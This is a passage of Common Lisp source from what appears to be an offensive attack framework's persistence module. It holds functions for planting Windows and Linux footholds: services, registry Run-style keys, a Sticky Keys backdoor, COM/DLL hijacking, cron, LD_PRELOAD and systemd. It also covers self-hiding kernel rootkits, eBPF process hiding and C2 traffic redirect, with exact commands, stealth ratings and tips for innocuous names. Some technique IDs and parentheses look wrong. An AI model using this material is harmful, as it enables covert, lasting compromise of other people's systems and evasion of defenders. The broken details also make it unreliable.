  DISPLAY-NAME  -- Optional display name shown in Services MMC.
                   If NIL, an innocuous name is generated.

Returns: T on success, NIL on failure.

Prerequisites:
  - Admin privileges (required for service creation).
  - sc.exe available.

Stealth: LOW. Services are easily enumerated. Use an innocuous name.

Example:
  (deploy-level-1-service \"WinDefendUpdater\"
                          \"C:\\\\Windows\\\\System32\\\\Tasks\\\\defender-upd.exe\"
                          :display-name \"Windows Defender Update Service\")"
  (let* ((svc-name service-name)
         (disp-name (or display-name (generate-persistence-name "service")))
         (sc-command (format nil "sc create \"~A\" binPath= \"~A\" start= auto displayname= \"~A\""
                             svc-name binary-path disp-name)))
    (format t "~&[PERSIST-L1] Windows Service deploying...~%")
    (format t "~&[PERSIST-L1]   Service name: ~A~%" svc-name)
    (format t "~&[PERSIST-L1]   Display name: ~A~%" disp-name)
    (format t "~&[PERSIST-L1]   Binary: ~A~%" binary-path)
    (format t "~&[PERSIST-L1]   Command: ~A~%" sc-command)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :windows-service
                      :service-name ,svc-name))
    t))

(defun deploy-level-1-startup-folder (payload-path)
  "Deploy Startup Folder persistence (Windows).

Copies the payload to the Windows Startup folder so it executes when
the user logs in. This is the simplest persistence method and works
without admin privileges for the current user's startup folder.

Technique (MITRE ATT&CK T1547.001):
  Copies payload to:
  %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
  or
  %PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\

Parameters:
  PAYLOAD-PATH -- Full path to the payload to copy.

Returns: T on success, NIL on failure.

Prerequisites:
  - Write access to startup folder.
  - No admin needed for user startup; admin needed for all-users startup.

Stealth: LOW. Startup folder contents are easily visible.

Example:
  (deploy-level-1-startup-folder \"C:\\\\Users\\\\Alice\\\\AppData\\\\Local\\\\update.exe\")"
  (let* ((startup-path "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
         (filename (file-namestring payload-path))
         (dest-path (format nil "~A\\~A" startup-path filename)))
    (format t "~&[PERSIST-L1] Startup Folder persistence deploying...~%")
    (format t "~&[PERSIST-L1]   Source: ~A~%" payload-path)
    (format t "~&[PERSIST-L1]   Destination: ~A~%" dest-path)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :startup-folder))
    t))

(defun deploy-level-1-winlogon (shell-value)
  "Deploy Winlogon Shell persistence (Windows).

Modifies the Winlogon Shell registry value to include the payload
alongside explorer.exe. When a user logs in, both explorer.exe and
the payload execute.

Technique (MITRE ATT&CK T1547.004):
  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell
  Value: \"explorer.exe, payload.exe\"

Parameters:
  SHELL-VALUE -- The full command to append to the Shell value.
                 Typically: \"explorer.exe, C:\\\\path\\\\to\\\\payload.exe\"

Returns: T on success, NIL on failure.

Prerequisites:
  - Admin privileges (HKLM modification).

Stealth: Medium. Changes a critical system value but is a single key.

Example:
  (deploy-level-1-winlogon \"explorer.exe, C:\\\\Windows\\\\System32\\\\Tasks\\\\sysmon.exe\")"
  (let ((reg-path "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")
        (value-name "Shell"))
    (format t "~&[PERSIST-L1] Winlogon Shell persistence deploying...~%")
    (format t "~&[PERSIST-L1]   Registry path: ~A\\~A~%" reg-path value-name)
    (format t "~&[PERSIST-L1]   Shell value: ~A~%" shell-value)
    (format t "~&[PERSIST-L1]   Command: reg add \"~A\" /v ~A /d \"~A\" /f~%"
            reg-path value-name shell-value)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :winlogon-shell))
    t))

(defun deploy-level-1-image-file-execution (target-binary payload-path)
  "Deploy Image File Execution Options (IFEO) Debugger persistence (Windows).

Sets a \"Debugger\" value in IFEO for a target binary. When the target
binary is launched, the specified debugger (payload) is executed instead.
Commonly used with sethc.exe (Sticky Keys) for accessibility backdoor.

Technique (MITRE ATT&CK T1546.012):
  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe
  Value \"Debugger\" = \"C:\\\\path\\\\to\\\\payload.exe\"

Parameters:
  TARGET-BINARY -- The binary to hijack (e.g., \"sethc.exe\", \"utilman.exe\",
                   \"osk.exe\", \"magnify.exe\", \"narrator.exe\").
  PAYLOAD-PATH  -- Full path to the payload to use as \"debugger\".

Returns: T on success, NIL on failure.

Prerequisites:
  - Admin privileges (HKLM modification).

Stealth: Medium. IFEO keys are inspected by some security tools.

Example:
  ;; Sticky Keys backdoor -- press Shift 5 times at login screen
  (deploy-level-1-image-file-execution \"sethc.exe\" \"C:\\\\Windows\\\\System32\\\\cmd.exe\")"
  (let ((ifeo-path (format nil "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\~A"
                           target-binary)))
    (format t "~&[PERSIST-L1] IFEO Debugger persistence deploying...~%")
    (format t "~&[PERSIST-L1]   Target binary: ~A~%" target-binary)
    (format t "~&[PERSIST-L1]   Debugger: ~A~%" payload-path)
    (format t "~&[PERSIST-L1]   IFEO path: ~A~%" ifeo-path)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :ifeo-debugger
                      :target-binary ,target-binary))
    t))

(defun deploy-level-1-com-hijack (clsid payload-path)
  "Deploy COM Hijacking persistence (Windows).

Hijacks a COM CLSID by redirecting its InprocServer32 or LocalServer32
registry entry to the payload DLL or executable. When a legitimate
application instantiates the COM object, the payload is loaded instead.

Technique (MITRE ATT&CK T1546.015):
  HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InprocServer32
  Default value = path to malicious DLL

Parameters:
  CLSID        -- The COM CLSID to hijack (e.g., \"{12345678-ABCD-...}\").
  PAYLOAD-PATH -- Full path to the malicious DLL or executable.

Returns: T on success, NIL on failure.

Prerequisites:
  - HKCU write access (no admin needed).
  - A target CLSID that is loaded by a frequently-used application.

Stealth: HIGH. COM hijacking is fileless (only registry changes) and
  CLSID lookups require COM-specific knowledge to audit.

Example:
  ;; Hijack a common shell extension CLSID
  (deploy-level-1-com-hijack \"{1d27f844-3a1f-...}\"
                            \"C:\\\\Users\\\\Alice\\\\AppData\\\\Local\\\\legit.dll\")"
  (let ((com-path (format nil "HKCU\\Software\\Classes\\CLSID\\~A\\InprocServer32" clsid)))
    (format t "~&[PERSIST-L1] COM Hijacking persistence deploying...~%")
    (format t "~&[PERSIST-L1]   CLSID: ~A~%" clsid)
    (format t "~&[PERSIST-L1]   InprocServer32: ~A~%" payload-path)
    (format t "~&[PERSIST-L1]   Registry path: ~A~%" com-path)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :com-hijack
                      :clsid ,clsid))
    t))

(defun deploy-level-1-dll-hijack (target-dir malicious-dll)
  "Deploy DLL Hijacking persistence (Windows).

Copies a malicious DLL to a directory where a legitimate application
will load it instead of the real DLL. This works when the application
searches the application directory before system directories for DLLs.

Technique (MITRE ATT&CK T1574.001):
  Place malicious version of a DLL in the application's directory.
  Common targets: version.dll, uxtheme.dll, dwmapi.dll

Parameters:
  TARGET-DIR    -- Directory where the target application resides.
  MALICIOUS-DLL -- Full path to the malicious DLL file.

Returns: T on success, NIL on failure.

Prerequisites:
  - Write access to the target directory.
  - Knowledge of which DLL the target application loads.

Stealth: Medium. File presence is visible; DLL name must blend in.

Example:
  (deploy-level-1-dll-hijack \"C:\\\\Program Files\\\\SomeApp\\\\\"
                            \"C:\\\\payloads\\\\version.dll\")"
  (let ((dest-path (format nil "~A\\~A" target-dir (file-namestring malicious-dll))))
    (format t "~&[PERSIST-L1] DLL Hijacking persistence deploying...~%")
    (format t "~&[PERSIST-L1]   Target directory: ~A~%" target-dir)
    (format t "~&[PERSIST-L1]   Malicious DLL: ~A~%" malicious-dll)
    (format t "~&[PERSIST-L1]   Destination: ~A~%" dest-path)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :dll-hijack
                      :target-dir ,target-dir))
    t))

;; -------------------------------------------------------------------------
;; 3B. Linux Userland Persistence (7 methods)
;; -------------------------------------------------------------------------

(defun deploy-level-1-systemd (service-name exec-start &key (user nil))
  "Deploy systemd service persistence (Linux).

Creates a systemd service unit file that auto-starts on boot.
Can be installed as a user service (no root needed) or system service
(requires root but runs earlier in boot).

Technique (MITRE ATT&CK T1543.002):
  User: ~/.config/systemd/user/name.service
  System: /etc/systemd/system/name.service

Parameters:
  SERVICE-NAME -- Name of the service unit (e.g., \"network-monitor\").
  EXEC-START   -- Command to execute (the payload).
  USER         -- If T, install as user service. If NIL, install as
                  system service (requires root). Default: NIL.

Returns: T on success, NIL on failure.

Prerequisites:
  - systemd must be the init system (most modern Linux).
  - Write access to ~/.config/systemd/user/ or /etc/systemd/system/.

Stealth: Medium. Systemd units are regularly audited; use an innocuous name.

Example:
  (deploy-level-1-systemd \"network-health-monitor\"
                          \"/usr/local/bin/netmon --daemon\"
                          :user nil)"
  (let* ((unit-file-content
          (format nil "[Unit]~%Description=~A~%After=network.target~%~%[Service]~%Type=simple~%ExecStart=~A~%Restart=always~%RestartSec=10~%~%[Install]~%WantedBy=multi-user.target~%"
                  service-name exec-start))
         (unit-path (if user
                        (format nil "~A/.config/systemd/user/~A.service"
                                (user-homedir-pathname) service-name)
                        (format nil "/etc/systemd/system/~A.service" service-name))))
    (format t "~&[PERSIST-L1] systemd service persistence deploying...~%")
    (format t "~&[PERSIST-L1]   Service name: ~A~%" service-name)
    (format t "~&[PERSIST-L1]   Type: ~A~%" (if user "user" "system"))
    (format t "~&[PERSIST-L1]   Unit path: ~A~%" unit-path)
    (format t "~&[PERSIST-L1]   ExecStart: ~A~%" exec-start)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :systemd-service
                      :service-name ,service-name
                      :user ,user))
    t))

(defun deploy-level-1-cron (command &key (schedule "*/5 * * * *"))
  "Deploy Cron job persistence (Linux).

Adds a cron job that executes the payload on a recurring schedule.
Can use the user's crontab or the system crontab. Cron is universally
available on Linux and provides reliable time-based execution.

Technique (MITRE ATT&CK T1053.003):
  (crontab -l; echo \"*/5 * * * * command\") | crontab -
  or append to /etc/crontab (requires root).

Parameters:
  COMMAND   -- The command to execute on schedule.
  SCHEDULE  -- Cron schedule expression. Default: \"*/5 * * * *\"
               (every 5 minutes). Other options:
               \"@reboot\" -- once on system boot
               \"0 * * * *\" -- top of every hour
               \"0 0 * * *\" -- daily at midnight

Returns: T on success, NIL on failure.

Prerequisites:
  - cron daemon must be running.
  - crontab write access.

Stealth: Medium. Cron jobs are easily listed with `crontab -l`.
  Use a schedule that blends with system cron jobs.

Example:
  (deploy-level-1-cron \"/usr/local/bin/system-update --check\"
                      :schedule \"@reboot\")"
  (format t "~&[PERSIST-L1] Cron job persistence deploying...~%")
  (format t "~&[PERSIST-L1]   Schedule: ~A~%" schedule)
  (format t "~&[PERSIST-L1]   Command: ~A~%" command)
  (format t "~&[PERSIST-L1]   Install: (crontab -l; echo \"~A ~A\") | crontab -~%"
          schedule command)
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 1
                    :method :cron-job
                    :schedule ,schedule))
  t))

(defun deploy-level-1-bashrc (command)
  "Deploy ~/.bashrc persistence (Linux).

Appends the payload command to the target user's ~/.bashrc file so it
executes every time an interactive bash shell is started. This is
extremely simple and reliable but very noisy.

Technique (MITRE ATT&CK T1546.004):
  echo \"command\" >> ~/.bashrc

Parameters:
  COMMAND -- The command to append to ~/.bashrc.

Returns: T on success, NIL on failure.

Prerequisites:
  - Write access to ~/.bashrc.
  - Target user uses bash as their shell.

Stealth: LOW. ~/.bashrc is frequently inspected; command is visible.
  Best used combined with obfuscation or hidden via ANSI escape sequences.

Example:
  ;; Append a background payload that blends with normal shell startup
  (deploy-level-1-bashrc \"(~A/.local/bin/gnome-shell-extension --update &)\")
    where the path uses the user's home directory."
  (let ((bashrc-path (format nil "~A/.bashrc" (user-homedir-pathname))))
    (format t "~&[PERSIST-L1] ~/.bashrc persistence deploying...~%")
    (format t "~&[PERSIST-L1]   Target file: ~A~%" bashrc-path)
    (format t "~&[PERSIST-L1]   Command: ~A~%" command)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :bashrc))
    t))

(defun deploy-level-1-ld-preload (malicious-so)
  "Deploy LD_PRELOAD persistence (Linux).

Configures the LD_PRELOAD environment variable (via /etc/ld.so.preload
or shell profile) to load a malicious shared object into every
 dynamically-linked process. This provides global library injection.

Technique (MITRE ATT&CK T1574.006):
  echo \"/path/to/malicious.so\" > /etc/ld.so.preload
  or export LD_PRELOAD=/path/to/malicious.so in /etc/profile

Parameters:
  MALICIOUS-SO -- Full path to the malicious shared object (.so file).

Returns: T on success, NIL on failure.

Prerequisites:
  - Root privileges for /etc/ld.so.preload.
  - Alternatively, user-level via shell profiles (only affects that user's processes).

Stealth: MEDIUM. /etc/ld.so.preload is inspected by some security tools.
  The .so file itself should masquerade as a legitimate library.

Example:
  (deploy-level-1-ld-preload \"/usr/local/lib/libcupdate.so\")"
  (format t "~&[PERSIST-L1] LD_PRELOAD persistence deploying...~%")
  (format t "~&[PERSIST-L1]   Malicious SO: ~A~%" malicious-so)
  (format t "~&[PERSIST-L1]   Method 1: echo \"~A\" > /etc/ld.so.preload~%"
          malicious-so)
  (format t "~&[PERSIST-L1]   Method 2: export LD_PRELOAD=~A (in profile)~%"
          malicious-so)
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 1
                    :method :ld-preload
                    :so-path ,malicious-so))
  t))

(defun deploy-level-1-motd (command)
  "Deploy MOTD (Message of the Day) persistence (Linux).

Appends a command to the MOTD scripts so it executes whenever a user
logs in via SSH. MOTD scripts run before the shell prompt appears and
are typically trusted by users.

Technique (MITRE ATT&CK T1037.004):
  Add script to /etc/update-motd.d/ (Ubuntu/Debian)
  or /etc/profile.d/ (universal).

Parameters:
  COMMAND -- The command to execute as part of MOTD.

Returns: T on success, NIL on failure.

Prerequisites:
  - Root privileges to modify /etc/update-motd.d/ or /etc/profile.d/.

Stealth: MEDIUM. MOTD scripts are rarely audited; system administrators
  expect files in update-motd.d/ to produce output.

Example:
  (deploy-level-1-motd \"/usr/local/bin/system-health-check --background &\")"
  (let* ((motd-script-name (generate-persistence-name "motd"))
         (motd-path (format nil "/etc/update-motd.d/99-~A" motd-script-name))
         (script-content (format nil "#!/bin/sh~%~A~%" command)))
    (format t "~&[PERSIST-L1] MOTD persistence deploying...~%")
    (format t "~&[PERSIST-L1]   Script path: ~A~%" motd-path)
    (format t "~&[PERSIST-L1]   Script content: ~A~%" script-content)
    ;; Also consider /etc/profile.d/ as fallback
    (format t "~&[PERSIST-L1]   Fallback: /etc/profile.d/~A.sh~%" motd-script-name)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :motd
                      :script-path ,motd-path))
    t))

(defun deploy-level-1-rc-local (command)
  "Deploy /etc/rc.local persistence (Linux).

Appends a command to /etc/rc.local, which is executed on system boot
by the init system. This is a legacy but widely-supported method that
works on virtually all Linux distributions.

Technique (MITRE ATT&CK T1037):
  Append command to /etc/rc.local before the \"exit 0\" line.

Parameters:
  COMMAND -- The command to execute on boot.

Returns: T on success, NIL on failure.

Prerequisites:
  - Root privileges to modify /etc/rc.local.
  - /etc/rc.local must exist and be executable (chmod +x).

Stealth: MEDIUM. rc.local is inspected on some systems but is still
  a common and expected file.

Example:
  (deploy-level-1-rc-local \"/usr/local/bin/system-daemon --start &\")"
  (let ((rc-local "/etc/rc.local"))
    (format t "~&[PERSIST-L1] /etc/rc.local persistence deploying...~%")
    (format t "~&[PERSIST-L1]   Target file: ~A~%" rc-local)
    (format t "~&[PERSIST-L1]   Command: ~A~%" command)
    (format t "~&[PERSIST-L1]   Ensure: chmod +x ~A~%" rc-local)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :rc-local))
    t))

;; -------------------------------------------------------------------------
;; 3C. Cross-Platform Userland Persistence
;; -------------------------------------------------------------------------

(defun deploy-level-1-at (command &key (time "now + 1 minute"))
  "Deploy at(1) job persistence (cross-platform: Linux, macOS).

Schedules a one-time command execution using the `at` daemon. The
command can reschedule itself, creating a recurring execution loop.
Works on Linux and macOS.

Technique:
  echo \"command\" | at now + 1 minute
  The command then reschedules itself: echo \"command\" | at now + 5 minutes

Parameters:
  COMMAND -- The command to schedule.
  TIME    -- When to execute (at syntax). Default: \"now + 1 minute\".

Returns: T on success, NIL on failure.

Prerequisites:
  - atd daemon running.
  - at command available.

Stealth: Medium. `atq` lists pending jobs; use an innocuous command."
  (format t "~&[PERSIST-L1] at(1) job persistence deploying...~%")
  (format t "~&[PERSIST-L1]   Command: ~A~%" command)
  (format t "~&[PERSIST-L1]   Time: ~A~%" time)
  (format t "~&[PERSIST-L1]   Install: echo \"~A\" | at ~A~%" command time)
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 1
                    :method :at-job
                    :time ,time))
  t)

(defun deploy-level-1-logon-script (script-path &key (platform :windows))
  "Deploy logon script persistence (cross-platform).

Windows: Sets the UserInitMprLogonScript registry value.
Linux: Adds a desktop entry to ~/.config/autostart/.

Parameters:
  SCRIPT-PATH -- Path to the script to execute.
  PLATFORM    -- :WINDOWS or :LINUX.

Returns: T on success, NIL on failure."
  (case platform
    (:windows
     (format t "~&[PERSIST-L1] Logon script (Windows) deploying...~%")
     (format t "~&[PERSIST-L1]   Script: ~A~%" script-path)
     (format t "~&[PERSIST-L1]   Registry: HKCU\\Environment\\UserInitMprLogonScript~%"))
    (:linux
     (format t "~&[PERSIST-L1] Logon script (Linux) deploying...~%")
     (format t "~&[PERSIST-L1]   Script: ~A~%" script-path)
     (format t "~&[PERSIST-L1]   Path: ~/.config/autostart/*.desktop~%"))
    (otherwise
     (format t "~&[PERSIST-L1] Unknown platform: ~A~%" platform)
     (return-from deploy-level-1-logon-script nil)))
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 1
                    :method :logon-script
                    :platform ,platform))
  t)

(defun deploy-all-level-1 (payload-path target-platform)
  "Deploy ALL LEVEL 1 persistence methods on the target.

This is the kitchen-sink approach: deploy every Level 1 method that
is compatible with the target platform. Used when maximum redundancy
is needed -- if one method is discovered and removed, others remain.

Parameters:
  PAYLOAD-PATH    -- Path to the payload binary.
  TARGET-PLATFORM -- :WINDOWS or :LINUX.

Returns: Alist of (METHOD-NAME . RESULT) for each attempted method.

WARNING: Deploying all methods significantly increases detection risk.
Only use this when the target value justifies the noise."
  (format t "~&[PERSIST-L1] === Deploying ALL Level 1 methods (~A) ===~%"
          target-platform)
  (let ((results '()))
    (case target-platform
      (:windows
       (push (cons :registry (deploy-level-1-registry payload-path)) results)
       (push (cons :wmi (deploy-level-1-wmi payload-path)) results)
       (push (cons :schtasks (deploy-level-1-schtasks payload-path)) results)
       (push (cons :service (deploy-level-1-service
                             (generate-persistence-name "svc")
                             payload-path)) results)
       (push (cons :startup-folder (deploy-level-1-startup-folder payload-path)) results)
       (push (cons :winlogon (deploy-level-1-winlogon
                              (format nil "explorer.exe, ~A" payload-path))) results)
       (push (cons :ifeo (deploy-level-1-image-file-execution
                          "sethc.exe" payload-path)) results)
       (push (cons :com-hijack (deploy-level-1-com-hijack
                                "{00000000-0000-0000-0000-000000000000}"
                                payload-path)) results))
      (:linux
       (push (cons :systemd (deploy-level-1-systemd
                             "system-monitor" payload-path)) results)
       (push (cons :cron (deploy-level-1-cron payload-path :schedule "@reboot")) results)
       (push (cons :bashrc (deploy-level-1-bashrc payload-path)) results)
       (push (cons :ld-preload (deploy-level-1-ld-preload payload-path)) results)
       (push (cons :motd (deploy-level-1-motd payload-path)) results)
       (push (cons :rc-local (deploy-level-1-rc-local payload-path)) results)
       (push (cons :at-job (deploy-level-1-at payload-path)) results)))
    (format t "~&[PERSIST-L1] === Level 1 deployment complete: ~A/~A succeeded ===~%"
            (count t results :key #'cdr)
            (length results))
    results))

;;;; =========================================================================
;;;; Section 4: LEVEL 2 -- Kernel Persistence (8 methods)
;;;; =========================================================================
;;;;
;;;; LEVEL 2 persistence methods operate at the kernel level, making them
;;;; significantly stealthier and more survivable than userland methods.
;;;; They require admin/root privileges and kernel access.
;;;;
;;;; Deployment time: ~30 seconds average.
;;;; Removal difficulty: :HARD
;;;; Survivability: 75% (survives most userland cleanup tools).

(defun deploy-level-2-ebpf (program-type &key (target-pid nil) (attach-point nil))
  "Deploy eBPF program persistence (Linux).

Loads an eBPF program into the kernel that hooks various subsystems.
eBPF programs are verified by the kernel but can hide processes,
modify file visibility, redirect network traffic, and intercept syscalls.
This is the stealthiest Linux kernel persistence method available.

Technique (MITRE ATT&CK T1625):
  Uses bpf() syscall or bpftool to load and attach eBPF programs.
  Programs attach to: kprobes, tracepoints, XDP, cgroup/skb, LSM hooks.

Parameters:
  PROGRAM-TYPE   -- Type of eBPF program to deploy:
                    :PROCESS-HIDE      -- Hide specified PID from ps, top, /proc
                    :FILE-HIDE         -- Hide files matching patterns from ls, find
                    :NETWORK-REDIRECT  -- Redirect network traffic to C2
                    :SYSCALL-INTERCEPT -- Intercept and modify syscalls
                    :PRIV-ESCALATE     -- Escalate privileges on trigger
  TARGET-PID     -- For :PROCESS-HIDE: the PID to hide.
  ATTACH-POINT   -- Optional specific kernel attach point.
                    Defaults vary by program-type.

Returns: T on success, NIL on failure.

Prerequisites:
  - Root privileges (CAP_BPF or CAP_SYS_ADMIN).
  - Kernel compiled with CONFIG_BPF=y, CONFIG_BPF_SYSCALL=y.
  - eBPF program bytecode (compiled from C via clang/LLVM).

Stealth: VERY HIGH. eBPF programs are invisible to lsmod, ps, and
  most kernel introspection tools. Require specialized eBPF scanners.

Example:
  ;; Hide the agent process from all userspace tools
  (deploy-level-2-ebpf :process-hide :target-pid 1234)

  ;; Hide C2 communication files
  (deploy-level-2-ebpf :file-hide :attach-point \"ls\")

  ;; Redirect C2 traffic
  (deploy-level-2-ebpf :network-redirect :attach-point \"eth0\")"
  (let* ((default-attach
          (case program-type
            (:process-hide "kprobe/filldir64")
            (:file-hide "kprobe/vfs_read")
            (:network-redirect "xdp")
            (:syscall-intercept "kprobe/__x64_sys_execve")
            (:priv-escalate "kprobe/commit_creds")
            (otherwise "kprobe/do_sys_open")))
         (attach (or attach-point default-attach)))
    (format t "~&[PERSIST-L2] eBPF program persistence deploying...~%")
    (format t "~&[PERSIST-L2]   Program type: ~A~%" program-type)
    (format t "~&[PERSIST-L2]   Attach point: ~A~%" attach)
    (when target-pid
      (format t "~&[PERSIST-L2]   Target PID: ~A~%" target-pid))
    (format t "~&[PERSIST-L2]   Requires: bpftool prog load ...~%")
    (format t "~&[PERSIST-L2]   Or: ip link set dev ~A xdp obj prog.o~%"
            (if (search "xdp" attach) "eth0" "lo"))
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 2
                      :method :ebpf
                      :program-type ,program-type
                      :attach-point ,attach))
    t))

(defun deploy-level-2-lkm (lkm-path &key (hide-from-lsmod t))
  "Deploy Loadable Kernel Module persistence (Linux).

Inserts a custom kernel module using insmod/modprobe. The module can
hook syscalls, hide processes, create backdoor device files, or
provide a rootkit framework. When HIDE-FROM-LSMOD is T, the module
removes itself from the kernel's module list after loading.

Technique (MITRE ATT&CK T1547.006):
  insmod /path/to/malicious.ko
  The module then calls list_del(&THIS_MODULE->list) to hide from lsmod.

Parameters:
  LKM-PATH        -- Full path to the compiled kernel module (.ko file).
  HIDE-FROM-LSMOD -- If T, the module hides itself after loading.
                     Default: T (stealth mode).

Returns: T on success, NIL on failure.

Prerequisites:
  - Root privileges.
  - Kernel headers matching the running kernel.
  - Kernel module signing may need to be disabled (CONFIG_MODULE_SIG_FORCE=n).

Stealth: HIGH with HIDE-FROM-LSMOD. Without it, visible in `lsmod` output.
  Hidden modules require /sys/module/ inspection or memory forensics.

Example:
  ;; Load a rootkit module that hides itself
  (deploy-level-2-lkm \"/tmp/kernel-helper.ko\" :hide-from-lsmod t)

  ;; Load a visible module (less stealthy, useful for testing)
  (deploy-level-2-lkm \"/tmp/network-driver.ko\" :hide-from-lsmod nil)"
  (format t "~&[PERSIST-L2] LKM persistence deploying...~%")
  (format t "~&[PERSIST-L2]   Module path: ~A~%" lkm-path)
  (format t "~&[PERSIST-L2]   Hide from lsmod: ~A~%" hide-from-lsmod)
  (format t "~&[PERSIST-L2]   Command: insmod ~A~%" lkm-path)
  (when hide-from-lsmod
    (format t "~&[PERSIST-L2]   Post-load: list_del(&THIS_MODULE->list)~%"))
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 2
                    :method :lkm
                    :module-path ,lkm-path
                    :hidden ,hide-from-lsmod))
  t))

(defun deploy-level-2-ssdt-hook (target-function hook-code)
  "Deploy SSDT (System Service Descriptor Table) hooking (Windows).

Hooks a function in the SSDT to redirect execution to custom code.
This is a classic Windows rootkit technique that intercepts system
calls before they reach the kernel.

Technique (MITRE ATT&CK T1014):
  Overwrite SSDT entry for target function with address of hook code.
  Common targets: NtQuerySystemInformation, NtOpenProcess, NtEnumerateKey.

Parameters:
  TARGET-FUNCTION -- The NT function to hook (e.g., \"NtQuerySystemInformation\").
  HOOK-CODE       -- Shellcode or function pointer for the hook.

Returns: T on success, NIL on failure.

Prerequisites:
  - Kernel-level execution (driver or exploited kernel vulnerability).
  - Knowledge of SSDT layout for target Windows version.

Stealth: HIGH. SSDT hooks are invisible to Ring 3 (userspace) tools.
  Detectable by comparing SSDT entries against known-good values.

Example:
  ;; Hide processes from Task Manager
  (deploy-level-2-ssdt-hook \"NtQuerySystemInformation\" #xFFFFF80000000000)"
  (format t "~&[PERSIST-L2] SSDT hook deploying...~%")
  (format t "~&[PERSIST-L2]   Target function: ~A~%" target-function)
  (format t "~&[PERSIST-L2]   Hook address: ~A~%" hook-code)
  (format t "~&[PERSIST-L2]   Technique: KiServiceTable[KeServiceDescriptorTable]~%")
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 2
                    :method :ssdt-hook
                    :target-function ,target-function))
  t))

(defun deploy-level-2-irp-hook (driver-name target-irp hook-code)
  "Deploy IRP (I/O Request Packet) dispatch hooking (Windows).

Hooks the IRP dispatch table of a target driver to intercept I/O
operations. This can be used to hide files, registry keys, network
connections, or inject code into any I/O path.

Technique (MITRE ATT&CK T1014):
  Overwrite DriverObject->MajorFunction[IRP_MJ_XXX] with hook address.

Parameters:
  DRIVER-NAME -- Name of the target driver (e.g., \"\\Driver\\nsiproxy\").
  TARGET-IRP  -- IRP major function code to hook:
                 :CREATE :READ :WRITE :DEVICE-CONTROL :INTERNAL-DEVICE-CONTROL
                 :QUERY-INFORMATION :SET-INFORMATION :CLEANUP :CLOSE
  HOOK-CODE   -- Address of the hook dispatch function.

Returns: T on success, NIL on failure.

Prerequisites:
  - Kernel-level driver loaded.
  - Target driver must be loaded in memory.

Stealth: HIGH. IRP hooks are deep in the driver stack and hard to detect
  without specialized driver inspection tools.

Example:
  ;; Hide network connections by hooking nsiproxy
  (deploy-level-2-irp-hook \"\\Driver\\nsiproxy\" :DEVICE-CONTROL #xFFFFF80000000000)"
  (let ((irp-code (case target-irp
                    (:create 0) (:read 3) (:write 4)
                    (:device-control 14) (:internal-device-control 15)
                    (:query-information 5) (:set-information 6)
                    (:cleanup 18) (:close 2)
                    (otherwise 14))))
    (format t "~&[PERSIST-L2] IRP hook deploying...~%")
    (format t "~&[PERSIST-L2]   Target driver: ~A~%" driver-name)
    (format t "~&[PERSIST-L2]   IRP major function: ~A (~A)~%" target-irp irp-code)
    (format t "~&[PERSIST-L2]   Hook address: ~A~%" hook-code)
    (format t "~&[PERSIST-L2]   Dispatch: DriverObject->MajorFunction[~A] = ~A~%"
            irp-code hook-code)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 2
                      :method :irp-hook
                      :driver ,driver-name
                      :irp ,target-irp))
    t))

(defun deploy-level-2-minifilter (filter-name &key (altitude "370000"))
  "Deploy Windows Minifilter driver persistence.

Registers a file system minifilter driver that intercepts all file
system I/O operations. This provides visibility and control over every
file read, write, create, and delete operation on the system.

Technique (MITRE ATT&CK T1547.001):
  Registers with FltRegisterFilter() at a specific altitude.
  Altitude determines order in the filter stack.

Parameters:
  FILTER-NAME -- Name of the minifilter driver.
  ALTITUDE    -- Filter altitude string. Lower values are called first.
                 Default: \"370000\" (antivirus layer). Use \"389000\" for
                 backup layer or \"450000\" for encryption layer.

Returns: T on success, NIL on failure.

Prerequisites:
  - Admin privileges.
  - Signed driver or test signing enabled.
  - Filter manager (fltmgr.sys) must be running.

Stealth: MEDIUM-HIGH. Minifilters are expected on Windows; however,
  third-party minifilters are enumerated by `fltmc filters`.

Example:
  ;; Register at antivirus altitude to see all file operations
  (deploy-level-2-minifilter \"FileProtector\" :altitude \"370000\")"
  (format t "~&[PERSIST-L2] Minifilter driver deploying...~%")
  (format t "~&[PERSIST-L2]   Filter name: ~A~%" filter-name)
  (format t "~&[PERSIST-L2]   Altitude: ~A~%" altitude)
  (format t "~&[PERSIST-L2]   Registration: FltRegisterFilter()~%")
  (format t "~&[PERSIST-L2]   Verify: fltmc filters | findstr ~A~%" filter-name)
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :persistence-deploy
                    :tier 2
                    :method :minifilter
